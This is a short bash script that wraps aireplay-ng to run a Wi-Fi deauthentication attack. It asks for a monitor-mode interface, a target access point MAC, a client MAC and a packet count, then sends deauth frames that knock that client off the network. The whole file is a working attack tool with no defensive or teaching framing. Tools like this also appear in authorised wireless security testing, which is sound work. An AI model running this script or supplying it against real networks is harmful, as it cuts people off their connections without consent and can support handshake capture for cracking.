#! /bin/bash

clear

echo "***START***"

echo "What Wireless Interface in Monitor Mode (i.e. wlan0mon): "
read interface

echo "What AP MAC Address: "
read aaddress

echo "What Client MAC Address: "
read caddress

echo "How Many Packets: "
read packets

aireplay-ng --deauth $packets -a $aaddress -c $caddress $interface

echo "***DONE***"

exit 0